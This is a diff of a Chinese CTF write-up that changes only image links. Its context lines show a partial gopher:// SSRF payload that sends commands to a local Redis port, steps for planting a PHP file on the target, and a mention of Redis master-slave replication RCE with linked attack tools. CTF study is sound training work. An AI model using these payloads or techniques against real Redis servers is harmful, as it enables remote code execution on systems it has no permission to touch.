@@ -167,15 +167,13 @@ gopher://0.0.0.0:6379/_%252a2%250d%250a%25244%250d%250aauth%250d%250a%25244%250d
 
 在靶机直接打?url=payload，然后访问b.php即可
 
-
-
-
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 预期解法是redis主从复制rce BUU环境有问题复现不了
 
 下载[redis-ssrf](https://github.com/xmsec/redis-ssrf)，修改[ssrf-redis.py](https://github.com/xmsec/redis-ssrf/blob/master/ssrf-redis.py)
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 下载[redis-rogue-server](https://github.com/Dliv3/redis-rogue-server) &#x20;
 
